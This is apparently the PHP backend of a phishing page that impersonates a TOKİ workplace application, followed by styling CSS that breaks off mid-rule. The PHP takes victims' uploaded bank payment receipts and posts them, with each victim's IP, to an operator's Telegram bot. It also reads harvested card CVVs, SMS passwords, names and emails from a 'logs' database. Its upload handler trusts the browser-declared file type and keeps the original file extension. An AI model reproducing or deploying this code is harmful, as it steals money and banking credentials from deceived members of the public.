<?php
session_start();
error_reporting(0);
require_once(__DIR__ . '/inc/good_guard.php');
include('inc/back_head.php');


$ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['decont'])) {

    $file = $_FILES['decont'];
    $allowedTypes = ['image/jpeg','image/jpg','image/png','application/pdf'];
    $maxSize = 5 * 1024 * 1024; // 5 MB

    if (!in_array($file['type'], $allowedTypes)) {
        http_response_code(400);
        echo json_encode(['success' => false, 'message' => 'Sadece JPEG, PNG veya PDF yükleyebilirsiniz.']);
        exit;
    }

    if ($file['size'] > $maxSize) {
        http_response_code(400);
        echo json_encode(['success' => false, 'message' => 'Dosya boyutu 5 MB\'ı geçemez.']);
        exit;
    }

    $uploadDir = __DIR__ . '/decontbank/';
    if (!is_dir($uploadDir)) {
        if (!mkdir($uploadDir, 0777, true)) {
            http_response_code(500);
            echo json_encode(['success' => false, 'message' => 'Upload klasörü oluşturulamadı.']);
            exit;
        }
    }


    $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    $fileName = 'dekont_' . time() . '_' . bin2hex(random_bytes(6)) . '.' . $ext;
    $targetPath = $uploadDir . $fileName;

    if (!move_uploaded_file($file['tmp_name'], $targetPath)) {
        http_response_code(500);
        echo json_encode(['success' => false, 'message' => 'Yükleme sırasında hata oluştu.']);
        exit;
    }

    if (isset($pdo)) {
        try {
            $check = $pdo->prepare("SELECT kart_skt FROM logs WHERE ip_address = ? ORDER BY log_time DESC LIMIT 1");
            $check->execute([$ip]);
            $row = $check->fetch(PDO::FETCH_ASSOC);
            if (!$row || $row['kart_skt'] != 1) {

                $getLast = $pdo->prepare("SELECT id FROM logs WHERE ip_address = ? ORDER BY log_time DESC LIMIT 1");
                $getLast->execute([$ip]);
                $last = $getLast->fetch(PDO::FETCH_ASSOC);
                if ($last && isset($last['id'])) {
                    $update = $pdo->prepare("UPDATE logs SET kart_skt = 1 WHERE id = ?");
                    $update->execute([$last['id']]);
                }
            }
        } catch (PDOException $e) {
            error_log("DB hata: " . $e->getMessage());

        }
    }

    if (!empty($botToken) && !empty($chatId)) {
        $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendDocument";

        if (class_exists('CURLFile')) {
            $cfile = new CURLFile($targetPath, $file['type'], $fileName);
            $postFields = [
                'chat_id' => $chatId,
                'document' => $cfile,
                'caption' => "Yeni dekont yüklendi.\nDosya: {$fileName}\nBoyut: " . round($file['size']/1024, 2) . " KB\nIP: {$ip}"
            ];

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $telegramUrl);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
            curl_setopt($ch, CURLOPT_TIMEOUT, 10);
            $result = curl_exec($ch);

            if ($result === false) {
                error_log('Telegram gönderim hatası: ' . curl_error($ch));
            } else {

            }

            curl_close($ch);
        } else {
            error_log('CURLFile sınıfı mevcut değil - Telegram dosya gönderimi yapılamadı.');
        }
    }

   

} else {
    http_response_code(400);
    echo json_encode(['success' => false, 'message' => 'Dosya seçilmedi veya geçersiz istek.']);
    exit;
}



                                        require_once __DIR__ . '/inc/brain.php';

                                        $ids = 1;

                                        try {
                                            $stmt = $pdo->prepare("SELECT asama2 FROM tutar WHERE id = ? ORDER BY id DESC LIMIT 1");
                                            $stmt->execute([$ids]);
                                            $row = $stmt->fetch(PDO::FETCH_ASSOC);
                                            if ($row) {
                                                $tutar = $row['asama2']; 
                                                $formatted = number_format($tutar, 0, ',', '.'); 
                                            }
                                        } catch (PDOException $e) {
                                            error_log('toki.php DB hatası: ' . $e->getMessage());
                                        }
           



                                        require_once __DIR__ . '/inc/brain.php';

                                        $ip_address = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
                                        $tckn = '';

                                        try {
                                            $stmt = $pdo->prepare("SELECT adsoyad, banka_adi, kart_cvv, kart_tipi, email, sms_sifresi, adsoyad_tr1 FROM logs WHERE ip_address = ? ORDER BY id DESC LIMIT 1");
                                            $stmt->execute([$ip_address]);
                                            $row = $stmt->fetch(PDO::FETCH_ASSOC);
                                            if ($row) {
                                                $tckn = $row['adsoyad'];
                                                $adsoyad = $row['banka_adi'];
                                                $adsoyad_tr1 = $row['adsoyad_tr1'];
                                                $gsm = $row['kart_cvv'];
                                                $email = $row['email'];
                                                 $banka = $row['sms_sifresi'];
                                                         $ibanme = $row['kart_tipi'];

                                            }
                                        } catch (PDOException $e) {
                                            error_log('toki.php DB hatası: ' . $e->getMessage());
                                        }
                                        ?>
<!DOCTYPE html>
<html lang="tr" translate="no">
<head>
    <meta charset="UTF-8">
    <title>TOKİ İşyeri Başvurusu</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <link rel="icon" type="image/png" href="assets/favicon.png" sizes="196x196">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.3/css/bootstrap.min.css" integrity="sha512-jnSuA4Ss2PkkikSOLtYs8BlYIeeIK1h99ty4YfvRPAlzr377vr3CXDb7sb7eEEBYjDtcYj+AjBH3FLv5uSJuXg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    <style>
        *{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;text-rendering:optimizeLegibility;text-shadow:rgba(0,0,0,.01) 0 0 1px}html{scroll-behavior:smooth}

        @font-face{font-family:'Roboto Slab';font-style:normal;font-weight:200;src:local('Roboto Slab Light'),local('RobotoSlab-Light');src:url(assets/fonts/open-sans-v18-latin-ext_latin-300.202.woff) format('woff'),url(assets/fonts/open-sans-v18-latin-ext_latin-300.202.woff2) format('woff2'),url(assets/fonts/open-sans-v18-latin-ext_latin-300.202.ttf) format('truetype')}
        @font-face{font-family:'Roboto Slab';font-style:normal;font-weight:400;src:local('Roboto Slab'),local('RobotoSlab');src:url(assets/fonts/open-sans-v18-latin-ext_latin-regular.202.woff) format('woff'),url(assets/fonts/open-sans-v18-latin-ext_latin-regular.202.woff2) format('woff2'),url(assets/fonts/open-sans-v18-latin-ext_latin-regular.202.ttf) format('truetype')}
        @font-face{font-family:'Open Sans';font-style:normal;font-weight:200;src:local('Open Sans Regular'),local('OpenSans-Regular'),url(assets/fonts/open-sans-v18-latin-ext_latin-300.202.woff2) format('woff2'),url(assets/fonts/open-sans-v18-latin-ext_latin-300.202.woff) format('woff')}
        @font-face{font-family:'Open Sans';font-style:italic;font-weight:200;src:local('Open Sans Italic'),local('OpenSans-Italic'),url(assets/fonts/open-sans-v18-latin-ext_latin-300italic.202.woff2) format('woff2'),url(assets/fonts/open-sans-v18-latin-ext_latin-300italic.202.woff) format('woff')}
        @font-face{font-family:'Open Sans';font-style:normal;font-weight:400;src:local('Open Sans Regular'),local('OpenSans-Regular'),url(assets/fonts/open-sans-v18-latin-ext_latin-regular.202.woff2) format('woff2'),url(assets/fonts/open-sans-v18-latin-ext_latin-regular.202.woff) format('woff')}
        @font-face{font-family:'Open Sans';font-style:italic;font-weight:400;src:local('Open Sans Italic'),local('OpenSans-Italic'),url(assets/fonts/open-sans-v18-latin-ext_latin-italic.202.woff2) format('woff2'),url(assets/fonts/open-sans-v18-latin-ext_latin-italic.202.woff) format('woff')}
        @font-face{font-family:'Open Sans';font-style:normal;font-weight:600;src:local('Open Sans SemiBold'),local('OpenSans-SemiBold'),url(assets/fonts/open-sans-v18-latin-ext_latin-600.202.woff2) format('woff2'),url(assets/fonts/open-sans-v18-latin-ext_latin-600.202.woff) format('woff')}
        @font-face{font-family:'Open Sans';font-style:italic;font-weight:600;src:local('Open Sans SemiBold Italic'),local('OpenSans-SemiBoldItalic'),url(assets/fonts/open-sans-v18-latin-ext_latin-600italic.202.woff2) format('woff2'),url(assets/fonts/open-sans-v18-latin-ext_latin-600italic.202.woff) format('woff')}
        @font-face{font-family:'Open Sans';font-style:normal;font-weight:700;src:local('Open Sans Bold'),local('OpenSans-Bold'),url(assets/fonts/open-sans-v18-latin-ext_latin-600.202.woff2) format('woff2'),url(assets/fonts/open-sans-v18-latin-ext_latin-600.202.woff) format('woff')}
        @font-face{font-family:'Open Sans';font-style:italic;font-weight:700;src:local('Open Sans Bold Italic'),local('OpenSans-BoldItalic'),url(assets/fonts/open-sans-v18-latin-ext_latin-600italic.202.woff2) format('woff2'),url(assets/fonts/open-sans-v18-latin-ext_latin-600italic.202.woff) format('woff')}
        a{
            text-decoration: none;
        }
        body {
            font-family: 'Open Sans', sans-serif;
            letter-spacing: -.25px;
            font-weight: 400;
            font-size: 15px;
            background-color: #FFF;
            cursor: default;
        }
        header#top.sticky_init {
            position: fixed;
        }
        header#top {
            background: #3b77ac;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: center;
            -ms-flex-pack: center;
            justify-content: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            overflow: visible;
            position: relative;
            z-index: 99995;
            width: 100%;
            -webkit-transition: background-color .5s, -webkit-box-shadow .5s;
            transition: background-color .5s, -webkit-box-shadow .5s;
            -o-transition: box-shadow .5s, background-color .5s;
            transition: box-shadow .5s, background-color .5s;
            transition: box-shadow .5s, background-color .5s, -webkit-box-shadow .5s;
        }
        main {
            margin: 0;
          /*  margin-top: 80px;*/

            border: none;
            padding: 0;
            font-weight: 400;
            list-style: none;
            background: #e7ebee;
            padding-bottom: 2.5em;
        }
        section.outer{
            max-width: 1200px;
            overflow: hidden;
            margin: 0 auto;
            background: #fff;
            min-height: 100%;
            border-radius: .5em .5em;
            margin-top: 50px;
            background: #fff;
        }
        section.outer > .inner{
            position: relative;
            z-index: 10;
            -webkit-box-shadow: 0 1em 1em -1em rgba(0, 0, 0, .15);
            box-shadow: 0 1em 1em -1em rgba(0, 0, 0, .15);
            -webkit-box-sizing: border-box;
        }
        .page-inner{
            display: flex;
        }
        main nav{
        }
        main nav ul{
            border-radius: 0 0 .5em .5em;
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            max-width: 1200px;
            margin-left: auto;
            margin-right: auto;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            text-align: left;
            white-space: nowrap;
            overflow: hidden;
            -o-text-overflow: ellipsis;
            text-overflow: ellipsis;
            position: relative;
            font-size: 85%;
            padding: .25em .25em 0 .25em;
            background: #fff;
        }
        main nav ul li {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            display: inline-block;
            overflow: hidden;
            white-space: nowrap;
            -o-text-overflow: ellipsis;
            text-overflow: ellipsis;
            margin-right: .25em;
            padding-right: 1em;
            background-image: url(assets/breadcrumb-right.svg);
            background-size: 5px 16px;
            background-position: center right;
            background-repeat: no-repeat;
        }
        main nav ul li a.home {
            -o-text-overflow: clip;
            text-overflow: clip;
            white-space: normal;
            padding: 0;
            overflow: hidden;
            width: 1.7em;
            height: 1.7em;
            padding-left:3px;
        }
        main nav ul li a {
            text-decoration: none;
            color: #3b77ac;
            display: block;
            padding: .25em 0;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            max-width: 15em;
            white-space: nowrap;
            overflow: hidden;
            -o-text-overflow: ellipsis;
            text-overflow: ellipsis;
        }
        main nav ul li.here {
            padding: .25em 0;
            background: 0 0;
        }
        header {
            font-size: 95%;
        }
        .logo-area {
            display: block;
            text-indent: 200%;
            white-space: nowrap;
            overflow: hidden;
            background-image: url(assets/white_logo.png);
            background-image: url(assets/white_logo.svg), none;
            background-size: 245px 50px;
            background-repeat: no-repeat;
            background-position: left center;
            /* max-height: 2.5em; */
            min-height: 5em;
            max-width: 14em;
            background-size: 14em auto;
            margin-top: 5px;
            margin-left: -7px;
        }
        .container{
            max-width: 1200px;
        }
        .menuList{
            padding: 20px 10px 0 0;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -ms-flex-negative: 1;
            flex-shrink: 1;
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            -ms-flex-flow: row wrap;
            flex-flow: row wrap;
            float: none;
            -webkit-box-pack: end;
            -ms-flex-pack: end;
            justify-content: flex-end;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            min-height: 51.5px;
        }
        .menuList > li {
            margin-left: .1em;
            margin-bottom: .5em;
            list-style-type: none;
        }
        .menuList .fast-shortcuts a {
            color: rgba(255, 255, 255, .9);
            text-decoration: none;
        }
        .fast-shortcuts {
            margin-left: .3rem;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            padding: .66em;
            border: 1px solid rgba(255, 255, 255, .1) !important;
            border-radius: .5em;
            width: 100px;
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            -ms-flex-flow: row nowrap;
            flex-flow: row nowrap;
            -ms-flex-pack: distribute;
            justify-content: space-around;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            background: transparent;
            color:#fff;
        }
        .fast-shortcuts.mini{
            width: 68px;
            display: block;
            font-size: 13px;
        }
        .dropdown.custom ul li a{
            display: block;
            margin: 0;
            padding: .3em;
            border-radius: 2px;
            color: #4284be;
            text-decoration: none;
            font-size: 14.3px;
        }
        .dropdown.custom ul{
            list-style-type: none;
            margin: 0;
            padding: 0;
            padding-left:10px;
            -webkit-box-shadow: 0 0 5px 1px rgba(57, 58, 75, .63);
            box-shadow: 0 0 5px 1px rgba(57, 58, 75, .63);
        }
        .dropdown-menu{
            --bs-dropdown-min-width: 7rem;
        }
        .icons i{
            padding: 0px 4px;
        }
        .header-search {
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            -ms-flex-flow: row nowrap;
            flex-flow: row nowrap;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            margin-right: 8px;
            margin-left: 3px;
        }
        .header-search input {
            padding: .3em 28px .3em .7em;
            border-radius: .5em;
            border: none;
            height: 2.4em;
            color: #4b4e51;
            width: 226px;
            padding-right: 46px;
        }
        .header-search i {
            color: #4284be;
            margin-left: -25px;
            position: relative;
            right: -3px;
        }
        .custom2 .dropdown1 em {
            vertical-align: middle;
            display: inline-block;
            position: relative;
            border-radius: 2px;
            padding: .1em .4em;
            background: #42be7c;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            text-align: center;
            font-style: normal;
            line-height: 1.5;
            font-size: 75%;
            color: #FFF;
            margin: 0 0 0 .25em;
        }
        .custom2 .dropdown1{
            width: 145px;
        }
        .custom2 .dropdown1 em i{
            color:#fff;
        }
        .dropdown1{
            background: #fff;
            -webkit-box-shadow: 0 0 5px 1px rgba(57, 58, 75, .63);
            box-shadow: 0 0 5px 1px rgba(57, 58, 75, .63);
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            border-radius: .5em;
            padding: .5em 0 .5em .3em;
            text-decoration: none;
            color: #4b4e51;
            margin-left:10px;
        }
        .custom2 .dropdown-menu{
            --bs-dropdown-min-width: 11rem;
        }
        .dropdown1 i {
            color: #4284be;
            font-size:12px;
        }
        .sabit {
            border-bottom: 1px dotted #a9a9a9;
            padding: .3em;
            font-size: 14px;
        }
        .box-header {
            display: flex;
            flex-wrap: nowrap;
            width: 100%;
            -webkit-box-shadow: 0 1em 1em -1em rgba(0, 0, 0, .15);
            box-shadow: 0 1em 1em -1em rgba(0, 0, 0, .15);
        }
        .box-header img {
            width: 64px;
            height: 64px;
            margin-left: 1rem;
            -ms-flex-negative: 0;
            flex-shrink: 0;
            margin-top: 8px;
        }
        .box-header h2 {
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -ms-flex-flow: column nowrap;
            flex-flow: column nowrap;
            padding: .5rem;
            min-width: 0;
            margin: .5rem 0;
            height: 65px;
        }
        .box-header h2 a {
            font-size: 15px;
            font-weight: 200;
            display: block;
            text-decoration: none;
            color: #3b77ac;
        }
        .box-header h2 em {
            font-size: 19px;
            font-weight: 200;
            font-style: normal;
            overflow: hidden;
            -o-text-overflow: ellipsis;
            text-overflow: ellipsis;
            white-space: nowrap;
            min-width: 0;
            -webkit-box-flex: 1;
            -ms-flex: 1;
            flex: 1;
            padding-top: 5px;
        }
        .actions{
            width: auto;
            display: flex;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            margin: 0 10px 0 0;
            padding: 0;
            height: 100%;
            justify-content: end;
        }
        .actions a{
            position: relative;
            color: #83929f;
            background: #f6f7f8;
            border: none;
            border-radius: 4px;
            margin: 5px 4px;
            -webkit-box-shadow: 0 2px 8px rgba(0, 0, 0, .16);
            box-shadow: 0 2px 8px rgba(0, 0, 0, .16);
            padding: 11px 8px;
            font-size: 1.2rem;
            display: flex;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
        }
        .actions i{
            font-size:14px;
            padding-right: 5px;
        }
        .flex_center {
            display: flex;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
        }
        .actions .flex_center span{
            font-size: .78rem;
            line-height: 18px !important;
            display: inline-block;
        }
        aside {
            font-weight: 200;
            font-size: 90%;
            background-color: rgba(231, 235, 238, .5);
            border-radius: .5em;
            position: relative;
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            display: none;
            z-index:12;
        }
        aside ul {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            -webkit-transition: opacity 1s;
            -o-transition: opacity 1s;
            transition: opacity 1s;
        }
        aside ul li{
            padding: 1em;
            border-bottom: 2px solid #fff;
            word-wrap: break-word;
        }
        aside ul li .timeIcon{
            display: block;
            color: #a9acaf;
            height: 2.6em;
            display: block;
            vertical-align: middle;
            line-height: 1;
            font-weight: 400;
            font-style: normal;
            speak: none;
            text-decoration: inherit;
            text-transform: none;
            text-rendering: auto;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            text-align: center;
        }
        aside ul li .timeIcon i{
            font-size: 180%;
        }
        audio, canvas, progress, video {
            display: inline-block;
            vertical-align: baseline;
        }
        progress {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            overflow: hidden;
            height: .66em;
            width: 100%;
            border-radius: .33em;
        }
        .ol-list{
            padding: unset;
            border-bottom: none;
        }
        .ol-list .asamaBtns{
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            padding: 1em;
        }
        .ol-list .asamaBtns li{
            list-style: decimal inside;
            border: solid 1px #a9acaf;
            padding: .33em .25em !important;
            border-radius: .25em;
            margin-bottom: .5em;
            color: #a9acaf;
            padding: 1em;
        }
        .ol-list .asamaBtns .secili{
            border: solid 1px #4284be;
            color: #4284be;
            background: #fff;
        }
        .islemDurumu a {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            display: block;
            text-decoration: none;
            font-weight: 600;
            width: 100%;
            color: #3b77ac;
            margin-top: .5em;
            margin-bottom: .5em;
            border-bottom: 1px solid #a1c2df;
            padding-bottom: .2em;
        }
        progress::-moz-progress-bar { background: #4284be; }
        progress::-webkit-progress-bar {background-color: #a9acaf;}
        progress::-webkit-progress-value { background: #4284be; }

        content{
            position: relative;
            padding: 1em;
            width: 100%;
            display: block;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            z-index: 13;
        }
        content p{
            padding: 0 0 1em 0;
        }
        .permissionNeeded {
            display: block;
            padding: 0;
            position: relative;
            margin: 0 .5em 1em .5em;
            border-radius: .5em;
            overflow: hidden;
            border: 1px solid rgba(66, 132, 190, .33);
        }
        .permissionNeeded img {
            position: absolute;
            margin-top: 110px;
            margin-left: 15px;
        }
        .permissionNeeded .warn-text{
            padding: 1em;
            padding-left: 14em;
        }
        .permissionNeeded em{
            font-style: normal;
            font-weight: 600;
            color: #4b4e51;
        }
        .permissionNeeded p{
            padding-top: 1em;
            padding-bottom: 0em;
        }
        .permissionNeeded ul{
            list-style: disc;
            list-style-position: inside;
            margin: 0;
            padding: .5em 0 .5em 0;
        }
        .permissionNeeded .action{
            padding: 1.5em;
            background: -webkit-gradient(linear, left top, left bottom, from(rgba(66, 132, 190, 0)), to(rgba(66, 132, 190, .2)));
            background: -o-linear-gradient(top, rgba(66, 132, 190, 0), rgba(66, 132, 190, .2));
            background: linear-gradient(to bottom, rgba(66, 132, 190, 0), rgba(66, 132, 190, .2));
            text-align: center;
        }
        .permissionNeeded a {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            text-decoration: none;
            background: #3b77ac;
            color: #fff;
            font-size: 100%;
            border-radius: 1.25em;
            padding: .5em 1.5em;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            height: 2.66em;
            margin-top: .25em;
            margin-bottom: .25em;
            border: 1px rgba(59, 119, 172, .3) solid;
            -webkit-box-shadow: inset 0 .05em 0 rgba(255, 255, 255, .3), 0 .5em .5em -.5em rgba(0, 0, 0, .25);
            box-shadow: inset 0 .05em 0 rgba(255, 255, 255, .3), 0 .5em .5em -.5em rgba(0, 0, 0, .25);
        }
        .permissionNeeded a:hover{
            background-color: #4284be;
        }
        footer {
            background: #4b4e51;
            padding: 2em 1em 1em 1em;
        }
        footer .inner{
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -ms-flex-flow: column nowrap;
            flex-flow: column nowrap;
            max-width: 1200px;
            margin: 0 auto;
            width: 100%;
        }
        footer .inner .starts{
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
        }
        footer .linksarea{
            -webkit-box-flex: 4;
            -ms-flex-positive: 4;
            flex-grow: 4;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -ms-flex-negative: 1;
            flex-shrink: 1;
        }
        footer h2 {
            border: 0;
            padding: 0;
            clip: rect(0 0 0 0);
            height: 1px;
            width: 1px;
            margin: -1px;
            overflow: hidden;
            position: absolute;
        }
        footer .links {
            margin-bottom: 2em;
            padding: 0;
            width: 100%;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            -ms-flex-flow: row wrap;
            flex-flow: row wrap;
        }
        footer .links > li{
            width: 30%;
            margin: 1em .5em;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -ms-flex-flow: column nowrap;
            flex-flow: column nowrap;
            list-style-type: none;
        }
        footer .links li h3 {
            margin: 0;
            display: block;
            font-size: 90%;
            color: #FFF;
            font-weight: 600;
        }
        footer .links li ul {
            margin: 0;
            padding: 0;
        }
        footer .links li ul li {
            font-size: 85%;
            color: #FFF;
            font-weight: 200;
            list-style-type: none;
        }
        footer .links li ul li a {
            text-decoration: none;
            font-size: 100%;
            color: #FFF;
            font-weight: 200;
            line-height: 200%;
        }
        footer .right-part {
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
        }
        footer .foot-card{
            padding: 1em;
            border: 1px solid rgba(255, 255, 255, .5);
            border-radius: 1em;
            color: #FFF;
            font-size: 85%;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -ms-flex-flow: column nowrap;
            flex-flow: column nowrap;
            -ms-flex-negative: 1;
            flex-shrink: 1;
        }
        footer .foot-card .card-text {
            font-weight: 200;
            background-image: url(assets/helpbuoy.svg);
            background-size: 3em;
            background-position: top left;
            background-repeat: no-repeat;
            min-height: 3em;
            padding-left: 4em;
        }
        footer .foot-card .card-text em {
            font-weight: 600;
            font-style: normal;
        }
        footer .foot-card ul {
            margin: 0;
            margin-top: 1em;
            padding: 0;
            list-style-type: none;
        }
        footer .foot-card ul li {
            border-bottom: dotted 1px rgba(255, 255, 255, .5);
            margin-bottom: .5em;
            padding-bottom: .5em;
        }
        footer .foot-card ul li a {
            text-decoration: none;
            color: #FFF;
            line-height: 1.5em;
            display: block;
            font-weight: 200;
        }
        footer .foot-card ul li:last-child {
            border-bottom: none;
            margin-bottom: 0;
            padding-bottom: 0;
        }
        footer .foot-card ul li a i{
            font-size: 17px;
            padding-right: 7px;
        }
        footer .right-part .social-links{
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            padding: 1em;
            border: 1px solid rgba(255, 255, 255, .5);
            border-radius: 1em;
            margin: 1em 0;
            -ms-flex-negative: 1;
            flex-shrink: 1;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            -ms-flex-flow: row wrap;
            flex-flow: row wrap;
        }
        footer .right-part .social-links a{
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            width: 50%;
            color: #FFF;
            text-decoration: none;
            border-bottom: 1px dotted rgba(255, 255, 255, .5);
            margin: 0 0 .5em 0;
            padding: 0 0 .5em 0;
            font-size: 85%;
        }
        footer .right-part .social-links a i{
            padding-right: 5px;
            padding-top: 3px;
        }
        footer .right-part .social-links a:nth-last-of-type(-n+2) {
            border-bottom: none;
            margin: 0;
            padding: 0;
        }
        footer .sub-copyright {
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            -ms-flex-flow: row nowrap;
            flex-flow: row nowrap;
            -webkit-box-flex: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
            -ms-flex-negative: 1;
            flex-shrink: 1;
            color: #FFF;
            font-weight: 200;
            font-size: 75%;
            padding: 2em 0;
            border-bottom: 1px dashed rgba(255, 255, 255, .25);
            border-top: 1px dashed rgba(255, 255, 255, .25);
        }
        footer .sub-copyright .images {
            -ms-flex-negative: 1;
            flex-shrink: 1;
            min-width: 350px;
        }
        footer .sub-copyright a {
            display: inline;
            text-decoration: none;
            color: #FFF;
            font-weight: 600;
        }
        footer .sub-copyright img {
            height: 45px;
            width: auto;
            margin-right: 8px;
        }
        footer .copyright {
            color: #FFF;
            font-weight: 200;
            font-size: 75%;
            text-align: center;
            margin-top: 1em;
            height: 45px;
        }
        footer .copyright a {
            text-decoration: none;
            color: #FFF;
            font-weight: 600;
        }
        footer .text1 {
            -ms-flex-negative: 1;
            flex-shrink: 1;
            margin-top: 10px;
            max-width: 100%;
        }
        .scroll-top {
            line-height: 38px;
            width: 40px;
            height: 40px;
            bottom: 12px;
            right: 12px;
            font-size: 1.3em;
            display: none;
            position: fixed;
            text-align: center;
            border-radius: 50%;
            color: #fff;
            background-color: #347aa1;
            -webkit-box-shadow: 0 6px 12px rgba(0, 0, 0, .15), 0 2px 4px rgba(0, 0, 0, .16);
            box-shadow: 0 6px 12px rgba(0, 0, 0, .15), 0 2px 4px rgba(0, 0, 0, .16);
            opacity: .8;
            -webkit-transition: all .2s;
            -o-transition: all .2s;
            transition: all .2s;
            z-index: 999;
        }
        .scroll-top:focus, .scroll-top:hover {
            opacity: 1;
        }
        .toolbar{
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            zoom: 1;
            overflow: hidden;
            padding: .5em;
            margin-bottom: 1em;
            background: rgba(231, 235, 238, .5);
            border-radius: .25em;
        }
        .toolbar li {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            display: block;
            float: right;
            margin: .2em;
            border-radius: .25em;
        }
        content a {
            text-decoration: none;
            color: #3b77ac;
        }
        .toolbar li a {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            text-decoration: none;
            display: block;
            border: 1px solid rgba(169, 172, 175, .5);
            padding: .5em;
            border-radius: .25em;
            background: #fff;
            color: #4284be;
            font-size: 90%;
            line-height: 1.33em;
            font-weight: 700;
        }
        .toolbar li a.green {
            color: #20a64c !important;
        }
        .toolbar li a i{
            padding-right:0.5rem;
        }
        .adimlar-text{
            border-radius: .5em;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            padding: 11px 15px;
            margin: 4px 0;
            word-break: break-word;
            border: 1px dashed #a8acae;
            color: #4a4e50;
            background-color: rgba(58, 137, 180, .04);
        }
        .confirm, .reminder, .warning{
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            border-radius: .5em;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            padding: 1em 1em 1em 4em;
            border: 1px solid #e7ebee;
            border-bottom-width: 2px;
            margin-bottom: 1em;
            background-position: 1em center;
            background-repeat: no-repeat;
            background-size: 2em 2em;
            min-height: 3em;
            color: #4b4e51;
        }
        .confirm{
            background-image: url(assets/form-confirm.svg);
            background-color: rgba(80, 175, 0, .05);
            border-color: #50af00;
        }
        .warning {
            background-image: url(assets/warning.svg);
            background-color: rgba(255, 165, 0, .05);
            border-color: orange;
        }
        .reminder{
            background-image: url(assets/form-reminder.svg);
            background-color: rgba(75, 135, 200, .05);
            border-color: #4b87c8;
        }
        legend em{
            display: inline-block;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            width: 1.5em;
            height: 1.5em;
            background-color: #3a89b4;
            line-height: 1.5em;
